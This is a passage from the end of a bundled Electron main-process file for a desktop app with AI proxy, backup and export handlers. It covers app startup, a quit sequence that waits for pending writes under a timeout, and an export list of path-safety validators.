    logger.setLogDir(import_node_path15.default.join(import_electron8.app.getPath("userData"), "logs"));
    logger.info("app ready", { platform: process.platform, version: import_electron8.app.getVersion() });
    logger.info("crashDumps path", { path: import_electron8.app.getPath("crashDumps") });
    registerProjectFileHandlers();
    registerStorageHandlers();
    registerAIProxyHandlers();
    registerAISettingsHandlers();
    registerBackupHandlers();
    registerLoggerHandlers();
    registerExportFileHandlers();
    createMenu();
    createWindow({ devServerUrl: VITE_DEV_SERVER_URL, distRenderer: DIST_RENDERER });
    startAutoBackup();
    import_electron8.app.on("activate", () => {
      if (import_electron8.BrowserWindow.getAllWindows().length === 0) {
        createWindow({ devServerUrl: VITE_DEV_SERVER_URL, distRenderer: DIST_RENDERER });
      }
    });
  });
}
var isQuittingInProgress = false;
var forceQuitTimer = null;
import_electron8.app.on("before-quit", (event) => {
  if (isQuittingInProgress) return;
  isQuittingInProgress = true;
  setQuitting(true);
  stopAutoBackup();
  clearRateLimitAuditTimers();
  abortAllAIRequests();
  void import_electron8.session.defaultSession.clearStorageData({
    storages: ["cookies", "shadercache", "serviceworkers", "cachestorage"]
  }).catch((e) => {
    logger.warn("Quit: clearStorageData failed", { error: e.message });
  });
  event.preventDefault();
  forceQuitTimer = setTimeout(() => {
    logger.warn("Quit: force exit after 5s timeout, pending writes may be lost");
    cleanupAllTmpSync();
    import_electron8.app.exit(0);
  }, 5e3);
  void awaitPendingWrites().finally(() => {
    if (forceQuitTimer) {
      clearTimeout(forceQuitTimer);
      forceQuitTimer = null;
    }
    cleanupAllTmpSync();
    import_electron8.app.exit(0);
  });
});
import_electron8.app.on("will-quit", () => {
  cleanupAllTmpSync();
});
import_electron8.app.on("window-all-closed", () => {
  if (process.platform !== "darwin") {
    import_electron8.app.quit();
  }
});
// Annotate the CommonJS export names for ESM import in node:
0 && (module.exports = {
  assertRealPathInside,
  isInsideDataDir,
  isSafeBackupPath,
  isSafeExportFilePath,
  isSafeIdentifier,
  isSafeProjectFilePath,
  isValidProjectFileData,
  resolveRealPath,
  validateAIProxyLLMParams,
  validateAIProxyParams
});
